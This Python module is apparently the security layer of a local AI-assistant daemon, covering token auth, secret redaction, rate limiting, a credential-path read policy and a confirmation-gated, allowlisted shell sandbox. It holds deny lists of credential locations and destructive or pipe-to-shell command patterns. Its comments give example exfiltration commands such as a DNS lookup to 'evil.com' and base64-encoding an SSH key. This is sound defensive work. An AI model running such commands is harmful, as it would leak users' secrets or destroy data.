"""Everything that stands between a model and the machine: the daemon token,
rate limiting, the file-read policy, the run_bash sandbox and the
allow-pattern / pending-confirmation bookkeeping."""

import fnmatch
import json
import os
import re
import secrets
import shlex
import subprocess
import threading
import time

from fastapi import Request

from .config import HOME, PERMISSIONS_FILE, TOKEN_FILE, rt

# ══════════════════════════════════════════════════════════════════════
# Daemon token
# ══════════════════════════════════════════════════════════════════════

def _load_token() -> str:
    try:
        if os.path.exists(TOKEN_FILE):
            with open(TOKEN_FILE, "r", encoding="utf-8") as f:
                return f.read().strip()
    except OSError:
        pass
    return ""


def ensure_token_file() -> None:
    """Generate a random daemon token on first start, stored with 0600 perms."""
    try:
        os.makedirs(os.path.dirname(TOKEN_FILE), exist_ok=True)
        if not os.path.exists(TOKEN_FILE) or os.path.getsize(TOKEN_FILE) == 0:
            with open(TOKEN_FILE, "w", encoding="utf-8") as f:
                f.write(secrets.token_urlsafe(32))
        os.chmod(TOKEN_FILE, 0o600)
    except OSError:
        pass


_DAEMON_TOKEN = ""


def daemon_token() -> str:
    """The expected token; re-read lazily so a rotated file is picked up."""
    global _DAEMON_TOKEN
    if not _DAEMON_TOKEN:
        _DAEMON_TOKEN = _load_token()
    return _DAEMON_TOKEN


def authorize(request: Request) -> bool:
    """True if the request carries the correct X-Prism-Token header.

    compare_digest() raises TypeError for non-ASCII str operands, so the
    comparison is done on UTF-8 bytes: constant time, defined for any input.
    """
    supplied = request.headers.get("X-Prism-Token", "")
    expected = daemon_token()
    if not expected:
        return False
    try:
        return secrets.compare_digest(supplied.encode("utf-8"), expected.encode("utf-8"))
    except (UnicodeEncodeError, TypeError, AttributeError):
        return False


# ══════════════════════════════════════════════════════════════════════
# Redaction
# ══════════════════════════════════════════════════════════════════════

_QUERY_KEY_RE = re.compile(r"([?&]key=)[^&\s\"']+")


def redact(text) -> str:
    """Strip API keys and the daemon token out of anything that may be logged,
    stored or shown: the worker proxy carries the Gemini key as `?key=` in the
    URL, and `requests` exceptions embed the full URL in their message."""
    text = "" if text is None else str(text)
    if not text:
        return text
    for key in rt.keys.values():
        if isinstance(key, str) and len(key) > 8:
            text = text.replace(key, "[REDACTED_API_KEY]")
    token = daemon_token()
    if token:
        text = text.replace(token, "[REDACTED_DAEMON_TOKEN]")
    return _QUERY_KEY_RE.sub(r"\1[REDACTED]", text)


# ══════════════════════════════════════════════════════════════════════
# Rate limiting (in-memory, per client address, /chat only)
# ══════════════════════════════════════════════════════════════════════

RATE_LIMIT_WINDOW = 60      # seconds
RATE_LIMIT_MAX = 10         # max requests per window per client
RATE_LIMIT_PRUNE_AT = 64    # only sweep the table once it is worth sweeping
_rate_limiter = {}          # client -> [hits, window_start]
_rate_lock = threading.Lock()


def _prune_rate_limiter(now: float) -> None:
    """Drop clients whose window has fully elapsed. Caller holds _rate_lock."""
    if len(_rate_limiter) < RATE_LIMIT_PRUNE_AT:
        return
    for c in [c for c, v in _rate_limiter.items() if now - v[1] > RATE_LIMIT_WINDOW]:
        _rate_limiter.pop(c, None)


def rate_limited(request: Request) -> bool:
    """True if the client exceeded the chat request rate.

    The window start is not refreshed on each hit: doing so let a client that
    kept retrying while throttled never age out of the window.
    """
    client = request.client.host if request.client else "unknown"
    now = time.time()
    with _rate_lock:
        _prune_rate_limiter(now)
        cur = _rate_limiter.get(client)
        if not cur or now - cur[1] > RATE_LIMIT_WINDOW:
            _rate_limiter[client] = [1, now]
            return False
        cur[0] += 1
        return cur[0] > RATE_LIMIT_MAX


# ══════════════════════════════════════════════════════════════════════
# File access policy
# ══════════════════════════════════════════════════════════════════════

# Places under $HOME that hold credentials or session material. Neither
# /read_file nor a run_bash argument may point into them.
SENSITIVE_HOME_PATHS = (
    "~/.ssh", "~/.gnupg", "~/.pki", "~/.password-store",
    "~/.config/prism", "~/.local/share/prism", "~/.cache/prism",
    # Shell config / history that often contains tokens or secrets
    "~/.bashrc", "~/.zshrc", "~/.bash_profile", "~/.zprofile", "~/.bash_logout",
    "~/.zshenv", "~/.bash_history", "~/.zsh_history", "~/.profile",
    "~/.netrc", "~/.pgpass", "~/.git-credentials",
    # Cloud / package credentials
    "~/.aws", "~/.config/gcloud", "~/.docker", "~/.kube", "~/.config/gh",
    "~/.local/share/keyrings",
    # Browser profiles and messengers that hold session credentials
    "~/.config/google-chrome", "~/.config/mozilla", "~/.mozilla",
    "~/.config/chromium", "~/.config/BraveSoftware",
    "~/.config/discord", "~/.config/vesktop", "~/.config/Signal",
    "~/.local/share/TelegramDesktop",
    # Password managers, editors' secret stores, and this very assistant
    "~/.config/Bitwarden", "~/.config/1Password",
    "~/.config/Code", "~/.vscode", "~/.config/Cursor",
    "~/.claude", "~/.config/Claude",
)
SENSITIVE_SYSTEM_PATHS = ("/etc", "/boot", "/dev", "/proc", "/sys", "/run")

# File names that are secrets wherever they live.
SENSITIVE_NAME_PATTERNS = (
    ".env", ".env.*", "*.pem", "*.key", "*.p12", "*.pfx", "*.kdbx", "*.gpg",
    "id_rsa*", "id_ed25519*", "id_ecdsa*", "id_dsa*",
    ".netrc", ".pgpass", ".git-credentials", "credentials", "credentials.json",
)

READ_FILE_MAX_BYTES = 25 * 1024 * 1024


def _resolved(path: str) -> str:
    return os.path.realpath(os.path.expanduser(path))


def _under(path: str, root: str) -> bool:
    return path == root or path.startswith(root + os.sep)


def is_sensitive_path(real_path: str) -> bool:
    """True when a fully-resolved path is, or lies inside, protected material."""
    for banned in SENSITIVE_HOME_PATHS:
        if _under(real_path, _resolved(banned)):
            return True
    name = os.path.basename(real_path)
    return any(fnmatch.fnmatch(name, pat) for pat in SENSITIVE_NAME_PATTERNS)


def allowed_read_path(path):
    """Resolve a client-supplied path for /read_file, or None if refused.

    The whole path is resolved with realpath() — leaf and every parent — so a
    symlink anywhere in it cannot escape $HOME or reach protected material.
    """
    if not path or not isinstance(path, str):
        return None
    try:
        real_home = os.path.realpath(HOME)
        real_path = os.path.realpath(path)
        if not _under(real_path, real_home):
            return None
        if any(_under(real_path, b) for b in SENSITIVE_SYSTEM_PATHS):
            return None
        if is_sensitive_path(real_path):
            return None
        return real_path
    except (OSError, ValueError):
        return None


# ══════════════════════════════════════════════════════════════════════
# run_bash sandbox
# ══════════════════════════════════════════════════════════════════════

# SECURITY MODEL: commands run with shell=False, so shell metacharacters
# (|, ;, $(), >, backticks) are inert — they become literal argv. The only
# remaining way to cause harm is an allowlisted BINARY that can itself execute
# code, write/delete files, or change permissions, so the allowlist is strictly
# read-only inspection. Deliberately excluded:
#   - code execution: git (-c alias/core.pager), interpreters, find (-exec)
#   - file write/overwrite: dd, tee, cp, mv, sort (-o), truncate, ln, mkdir,
#     touch, mktemp, archivers (extract anywhere), tree (-o)
#   - deletion: rm, rmdir; ownership: chmod, chown
ALLOWED_COMMANDS = {
    # filesystem inspection (read-only)
    "ls", "pwd", "stat", "file", "readlink", "du", "df", "wc",
    # text / data inspection
    "echo", "cut", "paste", "tr", "uniq", "nl", "rev", "fold", "expand",
    "unexpand", "pr", "strings", "od", "xxd", "hexdump", "diff", "cmp",
    "zipinfo", "base64", "jq", "md5sum", "sha256sum",
    # system info (read-only)
    "date", "whoami", "id", "uname", "free", "top", "ps", "test",
    "which", "whereis", "whatis", "type",
    # terminal (harmless without a tty)
    "clear", "tput", "stty",
    # network diagnostics
    "ping", "traceroute", "nslookup", "dig", "host", "whois",
    "ip", "ifconfig", "netstat", "ss",
}

# Commands that talk to the network. Each run is still one confirmation away,
# but they can never become a stored allow-pattern: `dig <encoded>.evil.com`
# under an auto-approved "dig *" would be a covert exfiltration channel.
NETWORK_EGRESS_COMMANDS = {"ping", "traceroute", "nslookup", "dig", "host", "whois"}

# Patterns that must never be auto-allowed — require per-use confirmation.
DANGEROUS_PATTERNS = [
    r"\brm\s+-rf\b", r"\brm\s+-fr\b", r"\bmkfs\b", r"\bdd\s+", r"\bsudo\b",
    r"\breboot\b", r"\bshutdown\b",
    r"\bcurl\b.*\|\s*(ba)?sh", r"\bwget\b.*\|\s*(ba)?sh",
    r".*\|\s*(ba)?sh\b", r"\b>\s*/etc\b", r"\b>\s*/boot\b",
    r"\bchmod\s+-R\s+777\b", r"\bmv\s+/\b", r"\bpasswd\b",
]

# Binaries that can execute code, write/overwrite/delete files, or change
# permissions. Already outside the allowlist; forced dangerous here too so
# that, should the allowlist ever widen, they can never be auto-approved or
# stored as a persistent allow-pattern.
WRITE_OR_EXEC_BINS = {
    "git", "dd", "tee", "cp", "mv", "rm", "rmdir", "mkdir", "touch", "mktemp",
    "ln", "sort", "truncate", "chmod", "chown", "chattr", "patch",
    "gzip", "gunzip", "bzip2", "bunzip2", "xz", "unxz", "zstd", "unzstd",
    "7z", "7za", "jar", "unzip", "tar", "cpio", "rsync", "install", "tree",
    "python", "python3", "node", "ruby", "perl", "php", "bash", "sh", "zsh",
    "find", "xargs", "env", "nohup", "awk", "gawk", "sed", "vi", "vim", "nano",
    "ex", "ed", "eval", "exec", "source",
}

_DANGEROUS_SUBSTRINGS = [
    "su ", "su\n", "su;", "su|",
    "pkexec", "visudo", "vipw", "vigr",
    "parted", "fdisk", "cfdisk",
    "mount ", "mount\n", "umount ",
    "iptables", "nft ", "ufw ",
    "systemctl ", "service ",
    "modprobe ", "insmod ", "rmmod ",
    "dd if=", "dd if=/", "dd of=/dev/",
    "mkfs.ext", "mkfs.xfs", "mkfs.btrfs",
    "truncate ", "chown ", "chmod ", "chattr ",
    "useradd ", "userdel ", "groupadd ", "groupdel ",
    "passwd ",
    "crontab ", "at ",
    "ansible-playbook", "terraform ",
    "/dev/shm/", "/proc/", "/sys/",
    "python -m http.server", "python3 -m http.server",
    "php -S ", "ruby -e ", "node -e ",
]

RUN_BASH_TIMEOUT = 30
# Tool output goes straight back into the model's context, and an unbounded
# read (`od /dev/zero`) would otherwise fill memory until the timeout.
RUN_BASH_MAX_OUTPUT = 64 * 1024


def command_binary(command: str) -> str:
    """Basename of the leading word of a command, lower-cased."""
    try:
        parts = shlex.split(command)
    except ValueError:
        parts = command.strip().split()
    return parts[0].split("/")[-1].lower() if parts else ""


def is_dangerous(command: str) -> bool:
    """Does the command need a fresh confirmation every time?

    Anything that can chain, substitute, redirect into system paths or run
    through a write-capable binary counts.
    """
    if not command:
        return False
    cmd = command.strip().lower()
    if command_binary(command) in WRITE_OR_EXEC_BINS:
        return True
    for pat in DANGEROUS_PATTERNS:
        if re.search(pat, cmd):
            return True
    if re.search(r"[;&|]", command):
        return True
    if "$(" in command or "`" in command or "<(" in command or ">(" in command:
        return True
    if re.search(r">>?\s*/(etc|boot)", command):
        return True
    if any(dc in cmd for dc in _DANGEROUS_SUBSTRINGS):
        return True
    if re.search(r"base64\s+(?:-d|--decode)", cmd):
        return True
    return False


def can_persist(command: str) -> bool:
    """May this command be saved as an "always allow" pattern?"""
    return not is_dangerous(command) and command_binary(command) not in NETWORK_EGRESS_COMMANDS


def _blocked_argument(args) -> str:
    """Return the first argument that points into protected material, or ''.

    Applies the /read_file policy to run_bash arguments: `base64 ~/.ssh/id_rsa`
    is as much a leak as reading the file through the API would be.
    """
    for raw in args[1:]:
        candidate = raw
        if raw.startswith("-"):
            if "=" not in raw:
                continue
            candidate = raw.split("=", 1)[1]  # --file=~/.ssh/id_rsa
        if not candidate:
            continue
        try:
            real = _resolved(candidate)
        except (OSError, ValueError):
            continue
        if is_sensitive_path(real):
            return raw
    return ""


def _run_capped(args, env, timeout: int, max_bytes: int):
    """Run argv, collecting at most max_bytes of stdout+stderr.

    Returns (stdout, stderr, truncated). The process is killed as soon as
    the budget is exhausted so a runaway producer cannot fill memory.
    """
    proc = subprocess.Popen(args, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                            stdin=subprocess.DEVNULL, env=env, shell=False)
    chunks = {"out": bytearray(), "err": bytearray()}
    truncated = {"flag": False}

    def pump(stream, key):
        while True:
            data = stream.read(8192)
            if not data:
                return
            budget = max_bytes - len(chunks["out"]) - len(chunks["err"])
            if budget <= 0:
                truncated["flag"] = True
                proc.kill()
                return
            chunks[key] += data[:budget]
            if len(data) > budget:
                truncated["flag"] = True
                proc.kill()
                return

    threads = [threading.Thread(target=pump, args=(proc.stdout, "out"), daemon=True),
               threading.Thread(target=pump, args=(proc.stderr, "err"), daemon=True)]
    for t in threads:
        t.start()
    try:
        proc.wait(timeout=timeout)
    except subprocess.TimeoutExpired:
        proc.kill()
        proc.wait()
        raise
    finally:
        for t in threads:
            t.join(timeout=2)
    return bytes(chunks["out"]), bytes(chunks["err"]), truncated["flag"]


def run_bash(command: str, env: dict) -> str:
    """Execute an allowlisted read-only command with shell=False."""
    try:
        try:
            args = shlex.split(command)
        except ValueError as e:
            return f"Command parsing error: {e}"
        if not args:
            return "Command is empty."
        binary = args[0].split("/")[-1].lower()
        if binary not in ALLOWED_COMMANDS:
            return f"Command '{args[0]}' is not in the allowed list."
        blocked = _blocked_argument(args)
        if blocked:
            return f"Access to '{blocked}' is blocked: it points at protected credentials or daemon state."

        out, err, truncated = _run_capped(args, env, RUN_BASH_TIMEOUT, RUN_BASH_MAX_OUTPUT)
        stdout = redact(out.decode("utf-8", errors="replace"))
        stderr = redact(err.decode("utf-8", errors="replace"))
        output = stdout + (f"\n[stderr]\n{stderr}" if stderr else "")
        if truncated:
            output += f"\n[output truncated at {RUN_BASH_MAX_OUTPUT // 1024} KB]"
        return output.strip() if output.strip() else "Command executed successfully."
    except subprocess.TimeoutExpired:
        return f"Command execution timed out after {RUN_BASH_TIMEOUT} seconds."
    except Exception as e:
        return f"Execution error: {redact(e)}"


# ══════════════════════════════════════════════════════════════════════
# Permission rules and pending confirmations
# ══════════════════════════════════════════════════════════════════════
#
# Every run_bash call is first evaluated to one of three actions:
#
#   deny   the command cannot run at all (binary outside the allowlist, a
#          protected path, a parse error) or a stored deny-rule matches; the
#          model gets the reason straight away and the user is not asked
#   allow  a stored allow-rule matches and the command is not dangerous
#   ask    everything else: parked until the user decides in the tab
#
# Rules live in ~/.config/prism/permissions.json as
# {"rules": [{"pattern": "ls *", "action": "allow"|"deny", "added": ts}]}
# and are matched fnmatch-style, deny before allow.

RULE_ACTIONS = ("allow", "deny")
MAX_RULE_PATTERN = 256


def load_rules() -> list:
    """Stored rules, re-read from disk on every call; malformed entries dropped."""
    try:
        if os.path.exists(PERMISSIONS_FILE):
            with open(PERMISSIONS_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
            raw = data if isinstance(data, list) else data.get("rules", []) if isinstance(data, dict) else []
            rules = []
            for r in raw:
                if not isinstance(r, dict) or not isinstance(r.get("pattern"), str) or not r["pattern"].strip():
                    continue
                action = r.get("action") if r.get("action") in RULE_ACTIONS else "allow"
                rules.append({"pattern": r["pattern"].strip(), "action": action, "added": r.get("added") or 0})
            return rules
    except (OSError, ValueError):
        pass
    return []


def save_rules(rules) -> None:
    try:
        os.makedirs(os.path.dirname(PERMISSIONS_FILE), exist_ok=True)
        with open(PERMISSIONS_FILE, "w", encoding="utf-8") as f:
            json.dump({"rules": rules}, f, indent=2, ensure_ascii=False)
        os.chmod(PERMISSIONS_FILE, 0o600)
    except OSError:
        pass


def allowed_patterns() -> list:
    return [r["pattern"] for r in load_rules() if r["action"] == "allow"]


def _save_allowed_patterns(patterns) -> None:
    """Replace the allow-rules (deny-rules are kept). Used by tests."""
    keep = [r for r in load_rules() if r["action"] != "allow"]
    save_rules(keep + [{"pattern": p, "action": "allow", "added": int(time.time())} for p in patterns])


def matches_pattern(command: str, pattern: str) -> bool:
    """fnmatch-style check ('git *' matches 'git status' but not 'git status | rm -rf')."""
    p = (pattern or "").strip().lower()
    c = (command or "").strip().lower()
    if not p or not c:
        return False
    if fnmatch.fnmatch(c, p):
        return True
    # 'cmd *' also allows the bare 'cmd'
    return p.endswith(" *") and c == p[:-2]


def matching_rule(command: str):
    """The rule that decides this command, deny-rules first; None when none match."""
    rules = load_rules()
    for action in ("deny", "allow"):
        for r in rules:
            if r["action"] == action and matches_pattern(command, r["pattern"]):
                return r
    return None


def command_ok_by_pattern(command: str) -> bool:
    """Does a stored allow-rule cover the command (and is it not dangerous)?"""
    if is_dangerous(command):
        return False
    r = matching_rule(command)
    return bool(r and r["action"] == "allow")


def pattern_candidates(command: str) -> list:
    """Patterns the user may store for this command, most general first.

    A simple command offers its leading word plus a wildcard ("ls *") and
    the exact command; anything with shell metacharacters is offered
    verbatim only, so a stored rule can never widen to other commands.
    """
    cmd = (command or "").strip()
    if not cmd:
        return []
    if re.search(r"[|>;&`$*?\[\]{}()\\]", cmd):
        return [cmd]
    first = cmd.split()[0][:64]
    out = [first + " *"]
    if cmd != first and cmd != first + " *":
        out.append(cmd)
    return out


def rule_pattern_error(pattern: str, action: str) -> str:
    """Why a hand-written rule is not acceptable, or '' when it is fine."""
    pat = (pattern or "").strip()
    if not pat or len(pat) > MAX_RULE_PATTERN:
        return f"pattern must be 1-{MAX_RULE_PATTERN} characters"
    if action not in RULE_ACTIONS:
        return 'action must be "allow" or "deny"'
    if action == "deny":
        return ""
    # An allow-rule must name one allowlisted, non-network binary and may
    # not start with a wildcard: "*" or "* -rf" would cover everything.
    first = pat.split()[0]
    if any(ch in first for ch in "*?[]"):
        return "an allow pattern must start with a command name, not a wildcard"
    binary = first.split("/")[-1].lower()
    if binary not in ALLOWED_COMMANDS:
        return f"'{binary}' is not in the allowed command list, so it can never run"
    if binary in NETWORK_EGRESS_COMMANDS:
        return f"'{binary}' reaches the network and cannot be allowed permanently"
    if is_dangerous(pat.replace("*", "x")):
        return "this pattern is on the dangerous list and cannot be allowed permanently"
    return ""


def add_rule(pattern: str, action: str) -> str:
    """Store or update a rule; returns an error message or ''."""
    err = rule_pattern_error(pattern, action)
    if err:
        return err
    pat = pattern.strip()
    rules = [r for r in load_rules() if r["pattern"] != pat]
    rules.append({"pattern": pat, "action": action, "added": int(time.time())})
    save_rules(rules)
    return ""


def remove_rule(pattern: str) -> bool:
    """Drop a stored rule; False when it was not there."""
    rules = load_rules()
    kept = [r for r in rules if r["pattern"] != pattern]
    if len(kept) == len(rules):
        return False
    save_rules(kept)
    return True


revoke_pattern = remove_rule


def grant_pattern(command: str, pattern: str = None) -> bool:
    """Persist an allow-rule for a command (safe, non-network ones only).

    `pattern` must be one of pattern_candidates(command); without it the
    most general candidate is stored.
    """
    cmd = (command or "").strip()
    if not cmd or not can_persist(cmd):
        return False
    candidates = pattern_candidates(cmd)
    pat = (pattern or "").strip() or (candidates[0] if candidates else "")
    if pat not in candidates:
        return False
    return add_rule(pat, "allow") == ""


def evaluate(command: str) -> dict:
    """Decide what happens to a run_bash call before anything runs.

    Returns {"action": "deny"|"allow"|"ask", "reason": str, "rule": pattern|None,
             "dangerous": bool, "persistable": bool, "patterns": [...]}.
    Static blocks come first: a command that could never run is refused
    without bothering the user.
    """
    cmd = (command or "").strip()
    info = {"action": "ask", "reason": "", "rule": None,
            "dangerous": is_dangerous(cmd), "persistable": can_persist(cmd),
            "patterns": pattern_candidates(cmd) if can_persist(cmd) else []}
    try:
        args = shlex.split(cmd)
    except ValueError as e:
        info.update(action="deny", reason=f"Command parsing error: {e}")
        return info
    if not args:
        info.update(action="deny", reason="Command is empty.")
        return info
    binary = args[0].split("/")[-1].lower()
    if binary not in ALLOWED_COMMANDS:
        info.update(action="deny", reason=f"Command '{args[0]}' is not in the allowed list of read-only commands.")
        return info
    blocked = _blocked_argument(args)
    if blocked:
        info.update(action="deny", reason=f"Access to '{blocked}' is blocked: it points at protected credentials or daemon state.")
        return info
    rule = matching_rule(cmd)
    if rule and rule["action"] == "deny":
        info.update(action="deny", rule=rule["pattern"],
                    reason=f"The user has a rule that always rejects commands matching '{rule['pattern']}'.")
        return info
    if rule and rule["action"] == "allow" and not info["dangerous"]:
        info.update(action="allow", rule=rule["pattern"], reason=f"Allowed by the rule '{rule['pattern']}'.")
    return info


PENDING_CONFIRM_TTL = 120   # seconds before an unanswered prompt counts as denied
PENDING_REAP_GRACE = 300    # seconds a resolved entry is kept so a late poll still reads it

# pending[tool_use_id] = {"ts": float, "resolved": None|"allow"|"deny"|"never",
#                          "command": str, "session_id": str, "provider": str, "model": str}
pending_confirm = {}
pending_lock = threading.Lock()


def expire_pending() -> list:
    """Deny timed-out confirmations, then reap ones nobody will read again.

    Returns the entries that were denied by this call (with their tool id
    as "tool_id") so the caller can record the denial in the conversation.
    """
    now = time.time()
    expired = []
    with pending_lock:
        for k, v in list(pending_confirm.items()):
            ts = v.get("ts", 0)
            if v.get("resolved") is None:
                if now - ts > PENDING_CONFIRM_TTL:
                    v["resolved"] = "deny"
                    v["resolved_at"] = now
                    v["timed_out"] = True
                    expired.append({**v, "tool_id": k})
            elif now - v.get("resolved_at", ts) > PENDING_REAP_GRACE:
                pending_confirm.pop(k, None)
    return expired


def register_pending(tool_id: str, command: str, session_id: str, provider: str, model: str, info: dict = None) -> dict:
    """Park a tool call until the user decides; returns the client payload."""
    info = info or evaluate(command)
    with pending_lock:
        pending_confirm[tool_id] = {
            "ts": time.time(), "resolved": None, "command": command,
            "session_id": session_id, "provider": provider, "model": model,
        }
    return {
        "pending": True,
        "tool_call_id": tool_id,
        "command": command,
        "dangerous": info["dangerous"],
        "persistable": info["persistable"],
        "patterns": info["patterns"],
        "session_id": session_id,
        "provider": provider,
        "model": model,
    }
